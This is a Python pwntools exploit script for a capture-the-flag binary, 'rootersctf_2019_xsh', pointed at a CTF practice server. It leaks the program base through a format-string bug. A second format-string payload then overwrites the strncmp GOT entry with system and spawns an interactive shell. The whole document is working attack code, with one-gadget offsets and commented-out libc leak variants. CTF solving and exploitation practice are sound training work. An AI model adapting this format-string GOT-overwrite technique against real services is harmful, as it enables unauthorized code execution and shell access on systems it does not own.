import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='rootersctf_2019_xsh'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/i386-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28839)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]



		io.recv()
		io.sendline('echo %p')
		elf.address=int(io.recvline(),16)-0x23ae
		# pay=fmtstr_payload(24,{elf.got['strncmp']:elf.plt['system']},write_size='short')
		first = int('0x' + hex(elf.plt['system'])[-4:], 16)
		second = int(hex(elf.plt['system'])[:6], 16)

		# Do the format string overwrite
		payload = 'echo' + p32(elf.got['strncmp']) + p32(elf.got['strncmp']+2)
		payload += '%{}c%24$hn%{}c%25$hn'.format(first-4-3, second-first)

		io.recv()
		io.sendline(payload)
		# io.sendline('echo '+'%26$s\x00\x00'+p32(elf.got['printf']))
		# libc_base=u32(io.recv(4)+'')-libc.sym['printf']
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		io.sendline('sh\x00')



		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue